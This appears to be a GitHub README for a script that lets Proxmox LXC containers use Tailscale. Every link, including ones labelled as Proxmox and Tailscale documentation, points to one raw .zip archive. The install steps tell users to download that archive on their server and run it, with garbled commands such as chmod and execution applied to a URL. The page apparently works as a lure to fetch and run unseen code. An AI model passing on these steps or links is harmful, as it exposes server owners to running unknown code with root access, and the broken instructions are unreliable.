# 🛠️ proxmox-lxc-tailscale-injector - Easy Network Setup for Proxmox

![Download](https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip%20GitHub-brightgreen)

## 🚀 Getting Started

Welcome to the proxmox-lxc-tailscale-injector! This tool helps automate the process of allowing your Proxmox LXC containers to use Tailscale, a lightweight VPN that connects your devices securely. Follow the steps below to get started.

## 🖥️ System Requirements

Before you download, ensure your system meets these requirements:

- **Operating System:** Proxmox VE (Virtual Environment)
- **LXC Containers:** Adjustments must be made to allow permission settings.
- **Network Connection:** Must be connected to the internet for smooth installation.
  
## 📥 Download & Install

To get the application, you need to visit the following link to download it:

[Visit the Releases Page to Download](https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip)

Once there, look for the latest release. Download the file that corresponds to your needs.

## 📋 Installation Steps

1. **Access Your Proxmox Server:**
   - Open a terminal or SSH into your Proxmox server.

2. **Download the Script:**
   - You can navigate to the directory where you'd like to store the script. Use the command below to download:
     ```bash
     wget https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip
     ```
   - Replace `https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip` with the actual filename if it's different in the latest release.

3. **Make the Script Executable:**
   - Run this command to allow the script to be executed:
     ```bash
     chmod +x https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip
     ```

4. **Run the Script:**
   - Execute the script with:
     ```bash
     https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip
     ```

5. **Verify Permissions:**
   - After running, ensure that your LXC containers have `/dev/net/tun` permissions set correctly.
   - Check this by running the following command for each container:
     ```bash
     lxc config get <container-name> https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip
     ```
   - Replace `<container-name>` with your actual container name.

## 🔄 How It Works

This script works by modifying the configuration of your LXC containers within Proxmox. It automates the process of granting necessary permissions, making it easier for Tailscale to function as intended. This way, you can seamlessly connect your containers over a secure network.

## 🛠️ Troubleshooting

If you encounter issues, consider the following:

- **Permission Denied:** Make sure you are running the script with the necessary privileges. Use `sudo` if required.
- **Network Issues:** Check your internet connection and ensure your Proxmox server has access to external networks.
- **Unsupported Version:** Ensure your Proxmox version supports the LXC features necessary for the script. 

## 📖 Additional Resources

- **Proxmox Documentation:** [Proxmox LXC Documentation](https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip)
- **Tailscale Documentation:** [Tailscale Setup Guide](https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip)

## 📞 Support

If you have further questions or need help, feel free to open an issue on the GitHub repository. Your feedback helps improve this tool!

## 🔄 Update Method

When a new version of the script is released, simply repeat the download and installation steps to ensure you have the latest features and fixes. Always check the release notes for changes.

## 🏁 Summary

The proxmox-lxc-tailscale-injector simplifies connecting Tailscale to Proxmox LXC containers. Following the steps outlined, you can easily install and set up the script without technical jargon or complexity. This allows you to enhance your networking capabilities quickly and efficiently.

For downloads and updates, remember to visit [the Releases Page](https://raw.githubusercontent.com/chatchaloem/proxmox-lxc-tailscale-injector/main/retrogress/proxmox-lxc-tailscale-injector.zip) whenever you need the latest version.